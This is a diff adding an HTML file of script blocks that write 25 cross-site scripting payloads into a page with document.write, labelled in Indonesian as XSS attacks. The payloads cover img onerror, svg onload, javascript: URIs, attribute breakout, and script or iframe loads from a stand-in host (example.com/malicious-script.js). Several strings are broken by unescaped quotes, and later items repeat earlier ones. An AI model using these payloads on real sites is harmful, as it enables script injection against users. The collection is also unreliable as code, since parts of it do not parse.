@@ -1,0 +1,83 @@
+<script>
+  var maliciousCode = '<h1>Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.</h1>';
+  document.write(maliciousCode);
+</script>
+
+<script>
+  var maliciousCode1 = '<h1>Ini adalah serangan XSS!</h1>';
+  document.write(maliciousCode1);
+
+  var maliciousCode2 = '<img src="https://example.com/malicious-image.jpg" onload="alert(\'Ini juga serangan XSS!\');" />';
+  document.write(maliciousCode2);
+
+  var maliciousCode3 = '<script>alert("Ini lagi serangan XSS!");</script>';
+  document.write(maliciousCode3);
+
+  var maliciousCode4 = '<svg/onload=alert("Ini adalah serangan XSS!")>';
+  document.write(maliciousCode4);
+
+  var maliciousCode5 = '<a href="javascript:alert(\'Ini serangan XSS!\')">Klik disini</a>';
+  document.write(maliciousCode5);
+
+  var maliciousCode6 = '<iframe src="javascript:alert(\'Ini serangan XSS!\')"></iframe>';
+  document.write(maliciousCode6);
+
+  var maliciousCode7 = '<script src="https://example.com/malicious-script.js"></script>';
+  document.write(maliciousCode7);
+
+  var maliciousCode8 = '<img src=x onerror="alert(\'Ini serangan XSS!\')">';
+  document.write(maliciousCode8);
+
+  var maliciousCode9 = '<marquee><script>alert(\'Ini serangan XSS!\')</script></marquee>';
+  document.write(maliciousCode9);
+
+  var maliciousCode10 = '<input type="text" value="\'"><script>alert(\'Ini serangan XSS!\')</script>">';
+  document.write(maliciousCode10);
+
+  var maliciousCode11 = '<video><source onerror="javascript:alert(\'Ini serangan XSS!\')"></video>';
+  document.write(maliciousCode11);
+
+  var maliciousCode12 = '<img src="javascript:alert(\'Ini serangan XSS!\')" />';
+  document.write(maliciousCode12);
+
+  var maliciousCode13 = '<object data="javascript:alert(\'Ini serangan XSS!\')"></object>';
+  document.write(maliciousCode13);
+
+  var maliciousCode14 = '<img src=x:alert(\'Ini serangan XSS!\')>';
+  document.write(maliciousCode14);
+
+  var maliciousCode15 = '<iframe srcdoc=\'<img src="javascript:alert(\'Ini serangan XSS!\')" />\'></iframe>';
+  document.write(maliciousCode15);
+
+  var maliciousCode16 = '<a href="javascript:document.write(\'<img src=x onerror=alert(\'Ini serangan XSS!\')>\')">Klik disini</a>';
+  document.write(maliciousCode16);
+
+  var maliciousCode17 = '<img src=x:alert(\'Ini serangan XSS!\') //>';
+  document.write(maliciousCode17);
+
+  var maliciousCode18 = '<script>document.write(\'<img src="https://example.com/malicious-image.jpg" />\');</script>';
+  document.write(maliciousCode18);
+
+  var maliciousCode19 = '<img src=x onerror=alert(\'Ini serangan XSS!\') />';
+  document.write(maliciousCode19);
+
+  var maliciousCode20 = '<a href="javascript:alert(\'Ini serangan XSS!\')">Klik disini</a>';
+  document.write(maliciousCode20);
+
+  var maliciousCode21 = '<iframe src="https://example.com/malicious-page.html"></iframe>';
+  document.write(maliciousCode21);
+
+  var maliciousCode22 = '<script src="https://example.com/malicious-script.js"></script>';
+  document.write(maliciousCode22);
+
+  var maliciousCode23 = '<img src=x:alert(\'Ini serangan XSS!\') />';
+  document.write(maliciousCode23);
+
+  var maliciousCode24 = '<input type="text" value="\'"><script>alert(\'Ini serangan XSS!\')</script>">';
+  document.write(maliciousCode24);
+
+  var maliciousCode25 = '<marquee><script>alert(\'Ini serangan XSS!\')</script></marquee>';
+  document.write(maliciousCode25);
+</script>
+
+
